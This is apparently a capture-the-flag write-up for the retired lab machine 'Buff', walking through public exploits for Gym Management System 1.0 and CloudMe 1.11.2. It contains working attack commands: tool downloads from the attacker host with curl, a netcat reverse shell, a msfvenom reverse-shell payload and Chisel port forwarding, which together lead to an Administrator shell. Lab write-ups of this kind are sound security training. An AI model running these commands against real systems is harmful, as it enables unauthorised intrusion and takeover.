# Buff

This is the write-up for the box Buff that got retired at the 21st November 2020.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.198    buff.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/buff.nmap 10.10.10.198
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

## Checking HTTP (Port 8080)

The web page seems to be a custom developed application for a fitness website and all pages in the menu have a PHP extension.
On the top right is a login form and the copyright on the bottom shows [Projectworlds.in](https://projectworlds.in/).

In the menu _Contact_ it says that it is made using _"Gym Management Software 1.0"_.
On the website **Projectworlds.in**, there are different PHP projects and one them is [Gym Management System 1.0](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/).

By searching for vulnerabilities for this software, there is a **Unauthenticated Remote Code Execution** vulnerability:
```
searchsploit gym

Gym Management System 1.0 - Unauthenticated Remote Code Execution
```

Using the Python exploit script:
```
python2 48506.py 'http://10.10.10.198:8080/'
```

It starts a shell on the box as the user _shaun_, but it is not possible to change directories as this is not a persistent shell.
We can upload **Netcat for Windows** to the box and connect to a reverse shell:
```
C:\xampp\htdocs\gym\upload> curl 10.10.14.11:8000/nc.exe -o nc.exe

C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.11 9001 -e powershell
```

The binary _nc.exe_ gets downloaded and after executing it, a reverse shell connection on my IP and port 9001 is established as _shaun_.

## Privilege Escalation

In the home directory _C:\Users\shaun\Downloads_ is a file called _CloudMe_1112.exe_.

After researching the file name, it seems to be software from [CloudMe](https://www.cloudme.com/) for a synchronization and storage service.
The number shows the _version 1.11.2_ which has a publicly available **Buffer Overflow** vulnerability:
```
searchsploit cloudme

CloudMe 1.11.2 - Buffer Overflow (PoC)
```

The exploit is a Python script that abuses a service on port 8888 that runs on the localhost of the box.

> NOTE: This port does not listen continuously and exploitation may take several tries.

Creating a payload with **Msfvenom** and replacing it in the exploit code:
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9002 -b '\x00\x0A\x0D' -f python
```

The port 8888 has to be forwarded to our client to make this exploit work, so I use [Chisel](https://github.com/jpillora/chisel) and upload it to the box:
```
curl 10.10.14.11:8000/chisel.exe -o chisel.exe
```

Starting the **Chisel server** on our client:
```
./chisel server --reverse --port 9003
```

Forwarding port 8888 from the box to our local client:
```
.\chisel.exe client 10.10.14.11:9003 R:8888:localhost:8888
```

Executing the exploit:
```
python3 48389.py
```

After executing the exploit script, the listener on my IP and port 9002 starts a reverse shell as _Administrator_!
